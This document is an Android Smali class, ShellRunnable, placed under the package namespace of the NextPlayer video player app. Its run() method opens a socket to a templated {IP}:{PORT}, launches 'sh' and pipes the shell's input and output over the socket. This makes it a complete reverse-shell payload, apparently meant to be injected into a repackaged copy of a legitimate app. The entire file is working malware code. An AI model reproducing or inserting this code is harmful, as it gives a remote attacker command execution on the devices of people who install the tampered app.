.class public Ldev/anilbeesetti/nextplayer/ShellRunnable;
.super Ljava/lang/Object;
.implements Ljava/lang/Runnable;

# direct methods
.method public constructor <init>()V
    .locals 0
    invoke-direct {p0}, Ljava/lang/Object;-><init>()V
    return-void
.end method

# virtual methods
.method public run()V
    .locals 14

    :try_start_0
    new-instance v0, Ljava/net/Socket;
    const-string v1, "{IP}"
    const/16 v2, {PORT}
    invoke-direct {v0, v1, v2}, Ljava/net/Socket;-><init>(Ljava/lang/String;I)V

    invoke-static {}, Ljava/lang/Runtime;->getRuntime()Ljava/lang/Runtime;
    move-result-object v1
    const-string v2, "sh"
    invoke-virtual {v1, v2}, Ljava/lang/Runtime;->exec(Ljava/lang/String;)Ljava/lang/Process;
    move-result-object v3

    invoke-virtual {v3}, Ljava/lang/Process;->getInputStream()Ljava/io/InputStream;
    move-result-object v4
    invoke-virtual {v3}, Ljava/lang/Process;->getErrorStream()Ljava/io/InputStream;
    move-result-object v5
    invoke-virtual {v3}, Ljava/lang/Process;->getOutputStream()Ljava/io/OutputStream;
    move-result-object v6

    invoke-virtual {v0}, Ljava/net/Socket;->getInputStream()Ljava/io/InputStream;
    move-result-object v7
    invoke-virtual {v0}, Ljava/net/Socket;->getOutputStream()Ljava/io/OutputStream;
    move-result-object v8

    const/16 v9, 1024
    new-array v10, v9, [B
    new-array v11, v9, [B
    new-array v12, v9, [B

    const/4 v13, 0x0   # v13 = 0

    :loop
    invoke-virtual {v4}, Ljava/io/InputStream;->available()I
    move-result v9
    if-lez v9, :err
    invoke-virtual {v4, v10, v13, v9}, Ljava/io/InputStream;->read([BII)I
    move-result v9
    if-lez v9, :err
    invoke-virtual {v8, v10, v13, v9}, Ljava/io/OutputStream;->write([BII)V

    :err
    invoke-virtual {v5}, Ljava/io/InputStream;->available()I
    move-result v9
    if-lez v9, :sock
    invoke-virtual {v5, v11, v13, v9}, Ljava/io/InputStream;->read([BII)I
    move-result v9
    if-lez v9, :sock
    invoke-virtual {v8, v11, v13, v9}, Ljava/io/OutputStream;->write([BII)V

    :sock
    invoke-virtual {v7}, Ljava/io/InputStream;->available()I
    move-result v9
    if-lez v9, :flush
    invoke-virtual {v7, v12, v13, v9}, Ljava/io/InputStream;->read([BII)I
    move-result v9
    if-lez v9, :flush
    invoke-virtual {v6, v12, v13, v9}, Ljava/io/OutputStream;->write([BII)V

    :flush
    invoke-virtual {v8}, Ljava/io/OutputStream;->flush()V
    invoke-virtual {v6}, Ljava/io/OutputStream;->flush()V
    goto :loop
    :try_end_0
    .catch Ljava/lang/Exception; {:try_start_0 .. :try_end_0} :catch_0

    :catch_0
    return-void
.end method
